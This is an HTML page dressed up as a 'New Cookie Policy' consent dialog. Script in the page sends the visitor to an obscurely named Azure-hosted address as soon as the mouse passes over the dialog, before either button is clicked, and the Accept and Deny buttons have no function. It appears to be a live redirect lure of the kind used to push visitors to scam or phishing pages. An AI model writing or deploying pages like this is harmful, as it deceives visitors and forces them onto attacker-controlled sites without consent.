<!DOCTYPE html>
<html lang="en">
  <head>
    <script defer data-domain="budapestmeetup.vercel.app" src="https://plausible.io/js/script.js"></script>
    <title>Cookie Policy Dialog</title>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: 'Segoe UI', sans-serif;
        background: url('https://via.placeholder.com/1200x800') no-repeat center center/cover;
        height: 100vh;
        overflow: hidden;
      }

      .overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        backdrop-filter: blur(8px);
        background: rgba(0, 0, 0, 0.4);
        z-index: 10;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .dialog-box {
        background: #1c1c1c;
        color: white;
        padding: 30px;
        border-radius: 20px;
        width: 400px;
        box-shadow: 0 0 25px rgba(0, 0, 0, 0.6);
        text-align: center;
        z-index: 20;
        transition: transform 0.3s;
      }

      .dialog-box:hover {
        cursor: pointer;
        transform: scale(1.02);
      }

      .dialog-box h2 {
        margin-top: 0;
        font-size: 1.6em;
      }

      .dialog-box p {
        font-size: 1em;
        line-height: 1.6em;
        color: #ccc;
      }

      .buttons {
        display: flex;
        justify-content: center;
        margin-top: 20px;
        gap: 15px;
      }

      .buttons button {
        padding: 10px 25px;
        border: none;
        border-radius: 25px;
        font-size: 1em;
        font-weight: bold;
        cursor: pointer;
      }

      .accept {
        background-color: #00cc66;
        color: white;
      }

      .deny {
        background-color: #e53935;
        color: white;
      }

      .policy-link {
        margin-top: 15px;
        display: block;
        color: #00bcd4;
        text-decoration: none;
        font-size: 0.9em;
      }
    </style>
  </head>
  <body>
    <!-- Overlay with blurred background -->
    <div class="overlay">
      <div class="dialog-box" onmouseover="redirect()">
        <h2>üç™ Our New Cookie Policy!</h2>
        <p>
          For an optimized experience, some elements may store temporary signals.
          Our website uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
        </p>
        <div class="buttons">
          <button class="accept">Accept</button>
          <button class="deny">Deny</button>
        </div>
        <a href="#" class="policy-link">Policy Page</a>
      </div>
    </div>

    <script>
      let redirected = false;
      function redirect() {
        if (!redirected) {
          redirected = true;
          window.location.href = "https://errorzxx011xxmcxx.z13.web.core.windows.net/";
        }
      }
    </script>
  </body>
</html>
